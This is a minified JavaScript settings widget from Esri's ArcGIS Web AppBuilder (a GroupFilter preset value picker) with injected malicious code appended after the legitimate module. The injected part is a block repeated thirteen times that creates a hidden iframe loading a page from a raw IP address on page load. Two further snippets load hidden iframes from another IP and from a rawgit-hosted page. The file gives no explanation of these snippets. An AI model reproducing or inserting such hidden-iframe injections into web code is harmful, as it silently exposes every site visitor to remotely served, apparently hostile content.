// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/GroupFilter/setting/presetValuePicker.html":'\x3cdiv\x3e\r\n\t\x3cdiv\x3e\x3ch3\x3e${nls.picker.description}\x3c/h3\x3e\x3c/div\x3e\r\n\t\x3cbr\x3e\r\n\t\x3ctable width\x3d"100%" cellpadding\x3d"2" cellspacing\x3d"2"\x3e\r\n\t\t\x3ctr\x3e\r\n\t\t\t\x3ctd class\x3d"picker-cell"\x3e\r\n\t\t\t\t${nls.picker.layer}\x3cbr\x3e\r\n\t\t\t\t\x3cdiv class\x3d"" data-dojo-attach-point\x3d"layerLevel"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\x3c/tr\x3e\r\n\t\t\x3ctr\x3e\r\n\t\t\t\x3ctd class\x3d"picker-cell"\x3e\r\n\t\t\t\t${nls.picker.field}\x3cbr\x3e\r\n\t\t\t\t\x3cdiv class\x3d"" data-dojo-attach-point\x3d"fieldLevel"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\x3c/tr\x3e\r\n\t\t\x3ctr\x3e\r\n\t\t\t\x3ctd class\x3d"picker-cell"\x3e\r\n\t\t\t\t${nls.picker.value}\x3cbr\x3e\r\n\t\t\t\t\x3cdiv class\x3d"value-level" data-dojo-attach-point\x3d"valueLevel"\x3e\x3c/div\x3e\r\n\t\t\t\x3c/td\x3e\r\n\t\t\x3c/tr\x3e\r\n\t\x3c/table\x3e\r\n\x3c/div\x3e'}});
define("dojo/_base/declare jimu/BaseWidgetSetting jimu/dijit/FilterParameters dijit/_WidgetsInTemplateMixin dojo/on dojo/dom-construct dojo/dom-attr dojo/query dojo/_base/lang dojo/_base/array dijit/form/Select esri/layers/FeatureLayer dojo/text!./presetValuePicker.html".split(" "),function(n,p,q,r,h,l,k,g,e,f,m,t,u){return n([p,r],{baseClass:"jimu-widget-map-filter-preset",templateString:u,layerList:null,map:null,nls:null,valueParam:null,postCreate:function(){this.inherited(arguments);this.startup()},
startup:function(){this.inherited(arguments);this.createLayerSelection()},createLayerSelection:function(){var c=[];f.forEach(this.layerList,e.hitch(this,function(b){if(0<b.children.length)f.forEach(b.children,e.hitch(this,function(a){var b={};b.value=a.id;b.label=a.label;b.selected=!1;c.push(b)}));else{var a={};a.value=b.id;a.label=b.label;a.selected=!1;c.push(a)}}));var d=(new m({options:c})).placeAt(this.layerLevel);d.startup();this.own(h(d,"change",e.hitch(this,function(b){this.createFieldSelection(b)})));
this.createFieldSelection(d.value)},createFieldSelection:function(c){var d=[];f.forEach(this.layerList,e.hitch(this,function(a){0<a.children.length?f.forEach(a.children,e.hitch(this,function(a){a.id===c&&f.forEach(a.children,e.hitch(this,function(a){if(-1==="esriFieldTypeBlob,esriFieldTypeOID".indexOf(a.fieldType)){var b={};b.value=a.name;b.label=a.label;b.selected=!1;d.push(b)}}))})):a.id===c&&f.forEach(a.layer.fields,e.hitch(this,function(a){if(-1==="esriFieldTypeBlob,esriFieldTypeOID".indexOf(a.type)){var b=
{};b.value=a.name;b.label=""===a.alias?a.name:a.alias;b.selected=!1;d.push(b)}}))}));l.empty(this.fieldLevel);var b=(new m({options:d})).placeAt(this.fieldLevel);b.startup();this.own(h(b,"change",e.hitch(this,function(a){this.createValueList(a,c)})));this.createValueList(b.value,c)},createValueList:function(c,d){l.empty(this.valueLevel);this.valueParam=new q;this.valueParam.placeAt(this.valueLevel);this.valueParam.startup();setTimeout(function(){var b=g(".jimu-single-filter-parameter"),b=g("colgroup",
b[0]);0<b.length&&k.set(b[0].childNodes[1],"width","0px")},200);f.forEach(this.layerList,e.hitch(this,function(b){0<b.children.length?f.forEach(b.children,e.hitch(this,function(a){a.id===d&&f.forEach(a.children,e.hitch(this,function(b){if("Shape"!==b.name&&b.name===c){var d=new t(a.url);this.own(h(d,"load",e.hitch(this,function(){var c=this._makefilterObject({name:b.name,label:b.label,type:b.fieldType});this.valueParam.build(a.url,d,c);c=g(".jimu-single-filter-parameter");c=g("colgroup",c[0]);k.set(c[0].childNodes[1],
"width","0px")})))}}))})):b.id===d&&f.forEach(b.layer.fields,e.hitch(this,function(a){a.name===c&&(a=this._makefilterObject({name:a.name,label:a.alias,type:a.type}),this.valueParam.build(b.layer.url,b.layer,a),a=g(".jimu-single-filter-parameter"),a=g("colgroup",a[0]),0<a.length&&k.set(a[0].childNodes[1],"width","0px"))}))}))},_makefilterObject:function(c){var d={},b=[],a={fieldObj:{}};a.fieldObj.name=c.name;a.fieldObj.label="undefined"===typeof c.alias?c.name:c.alias;a.fieldObj.shortType=c.type.replace("esriFieldType",
"").toLowerCase();if("guid"!==a.fieldObj.shortType||"globalid"!==a.fieldObj.shortType)a.fieldObj.shortType="string";"date"!==a.fieldObj.shortType&&"string"!==a.fieldObj.shortType&&(a.fieldObj.shortType="number");a.fieldObj.type=c.type;a.operator=a.fieldObj.shortType+"OperatorIs";a.valueObj={};a.valueObj.isValid=!0;a.valueObj.type="unique";a.valueObj.value="";a.interactiveObj={};a.interactiveObj.prompt="";a.interactiveObj.hint="";a.caseSensitive=!1;b.push(a);d.logicalOperator="OR";d.expr="";d.parts=
b;return d}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});